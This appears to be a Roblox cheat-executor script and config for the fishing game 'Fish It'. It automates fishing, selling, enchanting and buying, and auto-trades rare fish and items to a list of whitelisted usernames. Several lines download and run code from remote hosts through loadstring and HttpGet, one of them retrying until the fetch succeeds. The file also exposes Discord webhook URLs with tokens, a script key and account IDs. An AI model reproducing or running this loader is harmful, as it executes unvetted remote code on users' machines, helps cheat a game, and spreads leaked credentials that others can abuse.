_G.Config={UserID="a675440d-51e7-4396-a617-504754c4658e",discord_id="1206257142630195233",Note="LISTBARU"}local s;for i=1,5 do s=pcall(function()loadstring(game:HttpGet("https://cdn.yummydata.click/scripts/fishit"))()end)if s then break end wait(5)end
_G.FishItConfig = _G.FishItConfig or {
    ["Fishing"] = {
        ["Auto Perfect"] = false,
        ["Random Result"] = false,
        ["Auto Favorite"] = true,
        ["Fish Name"] = {
            "Sacred Guardian Squid",
            {Name = "Ruby", Variant = "Gemstone"},"Holiday Turtle Plushie","Gingerbread Ray","Tree Horse","Reindeer Shark","Giftback Turtle","Christmas Penguin", 
        },
        ["Auto Accept Trade"] = true,
    },
    ["Auto Trade"] = {
      ["Enabled"] = true,
        ["Whitelist Username"] = {"ynthnmrtin","blanknew40","moonmart0910","warungminang2","warungminang894"},
        ["Category Fish"] = {
            "Secret"
        },
        ["Fish Name"] = {"Ruby"
        },
        ["Item Name"] = {
            "Evolved Enchant Stone",
    },
},
    ["Farm Coin Only"] = {
        ["Enabled"] = false, -- Farm coins only [ cant buy rod, bait, enchant, weather ]
        ["Target"] = 190000,
    },
    ["Selling"] = {
        ["Auto Sell"] = true,
        ["Auto Sell Threshold"] = "Legendary",
        ["Auto Sell Every"] = 500,
    },
    ["Doing Quest"] = {
        ["Auto Ghostfinn Rod"] = true,
        ["Auto Element Rod"] = false,
 	["Unlock Ancient Ruin"] = true,
        ["Allowed Sacrifice"] = {
            "Blob Shark",
            "Ghost Shark",
            "Thin Armor Shark",
            "King Jelly",
            "Skeleton Narwhal",
            "Gladiator Shark",
            "Mosasaur Shark",
            "Cryoshade Glider",
            "Giant Squid",
            "Depthseeker Ray",
            "Bone Whale",
        },
        ["FARM_LOC_SECRET_SACRIFICE"] = "Ocean",

        ["Minimum Rod"] = "Astral Rod",
    },
    ["WebHook"] = {
        ["Link Webhook"] = "https://discord.com/api/webhooks/1415211763091247155/oPwylc3-SPn35TcC7mZKmFPnbGSqGa6xOqRAD2FMkBOLb0PbGRpkfcT_jgF6kS0gNMpX",
        ["Auto Sending"] = true,
        ["Category"] = {"Secret"},

        ["Link Webhook Quest Complete"] = "https://discord.com/api/webhooks/1449824144286945351/KFJOtI1N9AcNg3EXjXAGq7l90brfg2BIDuh1lOoSH-0YqwrI96tZIGuMPz4gjY3-OPPr",
    },
    ["Weather"] = {
        ["Auto Buying"] = true,
        ["Minimum Rod"] = "Astral Rod",
        ["Weather List"] = {
            "Wind",
        },
    },
    ["Potions"] = {
        ["Auto Use"] = true,
        ["Minimum Rod"] = "Astral Rod",
    },
    ["Totems"] = {
        ["Auto Use"] = true,
        ["Minimum Rod"] = "Ghostfinn Rod",
        ["Buy List"] = {
            "Luck Totem",
            "Mutation Totem",
        },
    },
    ["Event"] = {
        ["Start Farm"] = true,
        ["Minimum Rod"] = "Ghostfinn Rod",
        ["Event List"] = {
            ["Christmas Cave"] = false,
            ["Hacker Event"] = false,
            
        },
    },
    ["Enchant"] = {
        ["Auto Enchant"] = true,
        ["Roll Enchant"] = false,
        ["Evolved Roll Enchant"] = false, -- true = Roll Evolved Stone until get ANY evolved-only enchant from list, then fallback to regular stone
        ["Enchant List"] = {
            "SECRET Hunter",
            "Shark Hunter",
            "Mutation Hunter III",
            "Big Hunter I",
            "Fairy Hunter",
            "Reeler I",
            "Reeler II",
        },
        ["Second Enchant"] = true,
        ["Allowed Sacrifice"] = {
            "Blob Shark",
            "Ghost Shark",
            "Thin Armor Shark",
            "King Jelly",
            "Skeleton Narwhal",
            "Gladiator Shark",
            "Mosasaur Shark",
            "Cryoshade Glider",
            "Giant Squid",
            "Depthseeker Ray",
            "Bone Whale",
        },
        ["Second Enchant List"] = {
            "Perfection",
            
        },
        ["Minimum Rod"] = "Element Rod",
    },
    ["Bait List"] = {
        ["Auto Buying"] = true,
        ["Buy List"] = {
            "Midnight Bait",
            "Chroma Bait",
            "Corrupt Bait",
            "Aether Bait",
            "Singularity Bait",
        },
    },
    ["Rod List"] = {
        ["Auto Buying"] = true,
        ["Buy List"] = {
            "Grass Rod",
            "Midnight Rod",
            "Astral Rod",
            "Ares Rod",
            "Angler Rod",
        },
        ["Location Rods"] = { -- Farm location and minimum rod to start on that location, also only 1 rod and only 1 location
            ["Fisherman Island"] = {"Starter Rod"},
            ["Kohana Volcano"] = {"Grass Rod", "Midnight Rod"},
            ["Tropical Grove"] = {"Astral Rod"},
            ["Ancient Ruin"] = {"Element Rod","Ghostfinn Rod", "Angler Rod", "Ares Rod", "Bamboo Rod"},
        },
    },

    ["ExtremeFpsBoost"] = true,
    ["UltimatePerformance"] = true,
    ["Disable3DRender"] = false,
    ["AutoRemovePlayer"] = true,

    ["AutoReconnect"] = true,
    ["HideGUI"] = false,
    ["Debug"] = false,
    ["EXIT_MAP_IF_DISCONNECT"] = true,
}

script_key="7ECF8FC9340DD1F67092AC7E1E16CC04";

loadstring(game:HttpGet("https://paste.monster/lwDAcZvahN9G/raw/"))()

local s,r repeat s,r=pcall(function()return game:HttpGet("https://api.wintercode.dev/loader/fishit-78c86024ea87c8eca577549807421962.lua")end)wait(1)until s;loadstring(r)()
loadstring(game:HttpGet("https://raw.githubusercontent.com/FnDXueyi/list/refs/heads/main/game"))()



















